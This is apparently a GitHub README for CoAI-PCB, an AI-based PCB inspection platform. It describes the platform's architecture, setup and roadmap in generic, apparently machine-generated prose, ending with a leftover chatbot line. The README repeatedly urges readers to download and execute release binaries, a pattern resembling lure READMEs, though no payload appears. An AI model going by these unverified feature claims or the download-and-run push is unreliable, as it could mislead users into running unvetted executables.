https://github.com/denz-pro/CoAI-PCB/releases

[![Releases](https://img.shields.io/badge/Releases-Available-brightgreen?style=for-the-badge&logo=github)](https://github.com/denz-pro/CoAI-PCB/releases)

# CoAI-PCB: AI-Powered PCB Inspection Platform for Modern Manufacturing and Automation

<figure>
  <svg width="700" height="260" viewBox="0 0 700 260" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="PCB inspection illustration">
    <defs>
      <linearGradient id="grad" x1="0" y1="0" x2="1" y2="1">
        <stop offset="0%" stop-color="#0a8"/>
        <stop offset="100%" stop-color="#07f"/>
      </linearGradient>
      <pattern id="grid" width="20" height="20" patternUnits="userSpaceOnUse">
        <path d="M 20 0 L 0 0 0 20" fill="none" stroke="rgba(0,0,0,.08)" />
      </pattern>
    </defs>
    <rect width="700" height="260" fill="url(#grad)"/>
    <rect x="20" y="20" width="660" height="220" rx="14" fill="url(#grad)" opacity="0.15" stroke="white" stroke-width="2"/>
    <rect x="60" y="60" width="180" height="120" rx="6" fill="#111" stroke="#0f0" stroke-width="2"/>
    <rect x="260" y="60" width="360" height="40" rx="6" fill="#0a0" stroke="#fff" stroke-width="2"/>
    <rect x="260" y="110" width="360" height="40" rx="6" fill="#021" stroke="#fff" stroke-width="2"/>
    <rect x="60" y="180" width="480" height="40" rx="6" fill="#500" stroke="#fff" stroke-width="2"/>
    <g fill="none" stroke="#0ff" stroke-width="2">
      <path d="M 60 40 H 640" />
      <path d="M 60 70 H 640" />
      <path d="M 60 100 H 640" />
    </g>
    <g fill="#0ff" opacity="0.9">
      <circle cx="110" cy="120" r="6"/>
      <circle cx="160" cy="120" r="6"/>
      <circle cx="210" cy="120" r="6"/>
    </g>
  </svg>
</figure>

CoAI-PCB is an AI-powered platform for automated PCB inspection. It sits at the intersection of hardware, software, and data. The system uses advanced AI models to detect defects, analyze components, and verify polarity. It combines a React TypeScript frontend with a Django middleware backend. The hardware prototype features a custom inspection chamber equipped with cameras, lighting, and audio feedback for real-time guidance and verification. The project is part of RoshAI's Co.AI family, which focuses on practical, scalable AI solutions for industrial settings.

What you will find in this repository
- A modern, developer-friendly frontend built with React and TypeScript. It delivers a responsive UI for inspection workflows, defect visualization, and model insights.
- A robust backend powered by Django middleware. It orchestrates data capture, model inference, and results persistence. The backend is designed for easy integration with hardware controllers and cloud services.
- AI models and tooling for defect detection, component analysis, and polarity checks. The models are designed to operate on high-resolution PCB images and can adapt to new boards with minimal retraining.
- A hardware-oriented design philosophy. The architecture accommodates a custom inspection chamber, camera synchronization, lighting control, and user feedback mechanisms.
- Clear deployment and testing paths. The project supports local development, Docker-based environments, and optional cloud integration with Azure services.

Table of contents
- Why CoAI-PCB
- Project architecture
- Frontend (React + TypeScript)
- Backend (Django middleware)
- AI models and data
- Hardware integration
- Getting started
- Development workflow
- Testing and validation
- Deployment and cloud integration
- Security and privacy
- Documentation and citations
- Contribution guidelines
- Roadmap
- License
- Community and support

Why CoAI-PCB
PCB production lines demand speed, accuracy, and traceability. Manual inspection can be slow and error-prone. Automated inspection reduces waste, improves yield, and speeds up time to market. CoAI-PCB delivers:

- AI-powered defect detection to identify surface anomalies, missing components, and misalignments.
- Component analysis to verify the presence and orientation of parts.
- Polarity checks to ensure correct electrical polarity and wiring.
- Audio feedback in the hardware prototype to guide operators during the inspection cycle.
- A scalable frontend and backend that can be extended for new PCB designs and manufacturing lines.
- A modular architecture that supports both on-premises and cloud-enabled workflows.

Project architecture
CoAI-PCB follows a layered approach. Each layer is independent and communicates through well-defined interfaces. This makes the system easier to maintain and extend.

- Hardware layer: The inspection chamber hosts cameras, lighting, and audio feedback. It provides synchronized image captures and basic control signals to the software stack.
- Data layer: Raw images and inspection results are stored in a structured database with metadata for boards, batches, and operators. Data retention policies protect sensitive information.
- AI layer: Models run inference on captured images to detect defects, identify components, and verify polarity. The AI layer supports feedback loops to improve model quality over time.
- Backend layer: The Django middleware orchestrates data flow, authentication, API endpoints, and model inference requests. It serves as the bridge between hardware, frontend, and AI services.
- Frontend layer: The React TypeScript UI presents a clean, responsive interface for operators, engineers, and data scientists. It visualizes results, trends, and model metrics.
- Deployment layer: The system is designed for local setups and cloud-enabled deployments. It includes containerized services, configuration guides, and scalable deployment options.

Frontend (React + TypeScript)
- User experience: The frontend emphasizes clarity and speed. It provides dashboards for live inspection, batch history, defect heatmaps, and model performance. Each page is designed for day-to-day use in a production environment.
- Components: A reusable library of components handles charts, tables, image galleries, and real-time streams. TypeScript ensures type safety and easier maintenance.
- Accessibility: The UI follows accessible design patterns. Keyboard navigation and proper focus management are provided for all major controls.
- Internationalization: The frontend supports multiple languages to accommodate global teams. Language packs can be added with minimal changes to the UI code.

Backend (Django middleware)
- APIs: The Django middleware exposes RESTful endpoints for image uploads, inspection results, and model inferences. It also provides admin interfaces for operators and data scientists.
- Security: Authentication, authorization, and audit trails protect sensitive data. Role-based access controls ensure operators can only perform permitted actions.
- Data handling: The backend validates inputs, sanitizes data, and logs processing steps for traceability. It also coordinates batch processing and queue management for inference tasks.
- Integration points: The backend connects to hardware controllers, storage services, and optional cloud AI services. It is designed to work with Azure Cognitive Services, Azure Custom Vision, and other AI platforms when needed.

AI models and data
- Defect detection: Models scan PCB images for common defects such as solder bridges, tombstoning, missing components, and misalignment.
- Component analysis: Models identify components and verify their presence, orientation, and spec compliance. This helps catch counterfeit or misplaced parts.
- Polarity checks: Models analyze traces and component connections to verify polarity, ensuring safe and correct operation.
- Training data: A curated dataset of PCB images with labeled defects and components under varying lighting conditions is used for training and validation.
- Evaluation: Models are evaluated with precision, recall, and F1 scores. Cross-validation and test sets ensure robust performance across board types.
- Model management: The system provides tooling to version models, track experiments, and deploy new models with minimal downtime.

Hardware integration
- Inspection chamber: The hardware prototype includes a purpose-built chamber to hold PCBs during imaging. The design emphasizes consistent lighting and camera positioning for reproducible results.
- Cameras: High-resolution cameras capture images from multiple angles. Synchronized triggering reduces motion blur and ensures consistent exposure.
- Lighting: A programmable lighting system provides uniform illumination. Lighting presets optimize contrast for different PCB designs and materials.
- Audio feedback: In-chamber audio cues guide operators. Feedback helps with operator training and reduces inspection time.

Getting started
- Prerequisites: A modern Node.js environment for the frontend, Python 3.x for the backend, and Docker for containerized setups. A local database (PostgreSQL) is recommended for production-like environments.
- Quick start options: You can run the frontend and backend separately for development or use the provided Docker Compose setup for a one-command local environment.
- Data and assets: Prepare a dataset of PCB images with labeled defects and components for testing and model evaluation. If you plan to train new models, ensure you have sufficient labeling and quality images.

Installation and setup
- Repository structure overview:
  - frontend/ contains the React + TypeScript UI project with its own build system and assets.
  - backend/ contains the Django middleware, API endpoints, and model inference services.
  - hardware/ contains schematics and documentation around the inspection chamber and camera setup.
  - docs/ contains design notes, API references, and deployment guides.
- Local development steps:
  - Install dependencies for frontend: npm install in the frontend directory.
  - Install dependencies for backend: pip install -r requirements.txt in the backend directory.
  - Configure environment variables for API keys, database connections, and cloud service endpoints.
  - Run frontend: npm start in the frontend directory.
  - Run backend: python manage.py runserver in the backend directory.
  - If using Docker: docker-compose up --build to start all services in one command.
- Data handling:
  - Images are stored in a structured media directory. The system keeps metadata in a relational database.
  - Model outputs, including detections and heatmaps, are stored with timestamped records for traceability.
- Testing:
  - Unit tests cover frontend components, backend API endpoints, and data pipelines.
  - Integration tests verify end-to-end flows from image capture to defect reporting.
  - Manual testing steps help validate hardware integration and real-time feedback loops.

Usage patterns
- Live inspection workflow:
  - Operator places PCB in the inspection chamber.
  - Cameras capture high-resolution images from multiple angles.
  - The system runs inference to detect defects, identify components, and verify polarity.
  - Results are presented on the UI with confidence scores and heatmaps.
  - Audio feedback guides the operator through the inspection sequence.
  - Results are archived with metadata for traceability and audit purposes.
- Batch processing:
  - A batch workflow processes multiple PCBs in a queue.
  - Each board gets an independent inspection report with a full set of metrics.
  - The system supports batch-level summaries and per-board drill-down views.
- Model management:
  - View current model versions, training histories, and evaluation metrics.
  - Deploy new models with simple versioning and rollback options.
  - Track performance changes across board types and lighting conditions.
- Data privacy and security:
  - Access controls limit who can view sensitive images and results.
  - Data retention policies define how long images and reports are stored.
  - Encrypted storage and secure API calls protect data in transit and at rest.

Development workflow
- Branching and releases:
  - Use feature branches to work on UI components, API endpoints, or model integration.
  - Merge into main after passing tests and code reviews.
  - Releases are documented in the Releases section and include packaged assets for quick deployment.
- Coding standards:
  - Frontend: TypeScript types and interfaces, linting, and unit tests.
  - Backend: Django best practices, REST API design, and clear serialization rules.
  - AI: Clear model cards, training logs, and reproducible pipelines.
- Documentation:
  - Inline code documentation plus a living docs folder with API references and usage guides.
  - Tutorials for common tasks, such as adding a new PCB design, training a new model, or integrating a new camera.
- Testing and quality:
  - Automated tests run on pull requests.
  - Visual regression tests for the UI ensure layout consistency.
  - Performance tests for inference latency and throughput.

Testing and validation
- Functional tests:
  - Verify that the UI renders correctly across devices.
  - Validate data flows from image capture to result persistence.
  - Ensure that the AI inferences return expected field structures.
- Performance tests:
  - Measure inference time per board and per camera angle.
  - Track memory usage under load and with concurrent requests.
  - Validate database write throughput during batch processing.
- Validation experiments:
  - Cross-validate model performance across PCB designs.
  - Compare model results with human expert annotations.
  - Conduct defect detection trials on real-world boards and controlled test samples.
- Hardware tests:
  - Confirm camera synchronization and image alignment across the chamber.
  - Check lighting consistency and glare reduction across surfaces.
  - Validate audio feedback timing and accuracy during operator guidance.

Deployment and cloud integration
- Local deployment:
  - Docker Compose provides a straightforward path to bring up frontend, backend, and a database.
  - Use local storage for media assets and a local database for development.
- Cloud integration:
  - Azure Cognitive Services and Azure Custom Vision are supported as optional inference backends.
  - The architecture allows switching between on-prem and cloud inference with minimal changes.
  - When using cloud services, ensure proper authentication and data transfer policies.
- Hybrid setups:
  - A common pattern uses on-prem data capture with cloud model updates.
  - The system can push anonymized results for centralized analytics while keeping raw images on-site when required.
- Security considerations:
  - Ensure secure communication channels between components.
  - Use role-based access control and audit logs for sensitive actions.
  - Apply data retention and deletion policies aligned with production needs.

Security and privacy
- Data protection:
  - Images and inspection results may contain sensitive design information. Limit access to authorized users.
  - Encrypt data in transit and at rest where possible.
- Access controls:
  - Implement multi-factor authentication for administrative actions.
  - Separate operator roles from data scientists for safer workflows.
- Compliance:
  - Align with industry practices for industrial automation and data management.
  - Document data handling practices and retention policies for audits.
- Operational security:
  - Regularly update dependencies to mitigate known vulnerabilities.
  - Monitor for unusual access patterns and implement incident response procedures.

Documentation and references
- API reference:
  - Detailed endpoints for image uploads, inferences, and result retrieval are documented in the docs folder.
- Data schemas:
  - The project defines clear schemas for boards, batches, images, and results to ensure consistent data handling.
- Model cards:
  - Each AI model ships with a card that describes purpose, inputs, outputs, limitations, and recommended usage.
- Hardware documentation:
  - The hardware folder includes chamber dimensions, camera mounting points, lighting arrangements, and wiring diagrams.
- Tutorials:
  - Step-by-step guides cover setting up a local environment, adding a new PCB design, and integrating a new camera or light source.
- Release notes:
  - A detailed changelog tracks feature additions, bug fixes, and performance improvements across versions.

Contribution guidelines
- Welcome new contributors:
  - Start with issues labeled “good first issue” to become familiar with the codebase.
  - Follow the project’s coding standards and run tests before submitting a pull request.
- Code review:
  - Each PR should include a short summary of changes and rationale.
  - Reviewers focus on correctness, maintainability, and potential side effects.
- Documentation contributions:
  - Improve docs where gaps exist.
  - Update API references and model cards when adding new endpoints or models.
- Community:
  - Join discussions on design decisions and feature planning.
  - Share experiments and results to help the project evolve.

Roadmap
- Short-term goals:
  - Stabilize core defect detection and polarity checks across multiple PCB designs.
  - Improve component analysis accuracy and reduce false positives.
  - Enhance real-time feedback and UI responsiveness in the inspector.
- Medium-term goals:
  - Expand hardware support for additional camera configurations.
  - Integrate more Azure AI services for scalable inference.
  - Add automated data labeling aids to accelerate model improvements.
- Long-term goals:
  - Build end-to-end deployment pipelines for manufacturing environments.
  - Develop certified adapters for enterprise-grade hardware controllers.
  - Establish a community-driven model marketplace for PCB designs.

License
- This project is released under a permissive license suitable for research, development, and commercial use. See LICENSE for details.

Get involved
- Releases and downloads:
  - The project provides packaged releases that include frontend assets, backend configurations, and sample data. Access the releases here: https://github.com/denz-pro/CoAI-PCB/releases
  - For quick access, you can visit the releases page to download the necessary binaries and installers. The link above points to the releases section where the assets live.
- Community channels:
  - Open issues for bug reports, feature requests, and discussions.
  - Pull requests welcome. Describe the change, its motivation, and its impact.
- Support:
  - If you run into trouble, check the documentation first. Look for troubleshooting sections in the docs folder.
  - When needed, provide logs, environment details, and steps to reproduce issues to help maintainers diagnose problems quickly.

Releases and download guidance
- The repository provides a path to releases that include the necessary binaries and installers for different platforms. Since the link includes a path, the release assets need to be downloaded and executed as part of installation. You will use these assets to set up the environment quickly and to validate that the system runs in a real hardware setting.
- The same link appears again here to remind you where the packaged assets live and to help you navigate to the exact files you need for installation and testing: https://github.com/denz-pro/CoAI-PCB/releases
- If you prefer a manual setup, you can clone the repository and run the frontend, backend, and hardware integration steps described in the Getting started section. However, the releases offer a convenient, pre-baked environment with properly configured dependencies and sample data.

End notes
- CoAI-PCB combines AI, hardware, and software into a cohesive platform for PCB inspection. It is built with a practical lens toward manufacturing environments and real-world constraints.
- The project emphasizes maintainability, extensibility, and clear data practices. It invites engineers, researchers, and operators to contribute and improve the system over time.
- The README intentionally reflects the project’s practical orientation: a balance of technical depth and actionable steps to get started, test, and evolve the platform.

If you need adjustments to sections, tone, or emphasis, tell me which parts to expand or refine.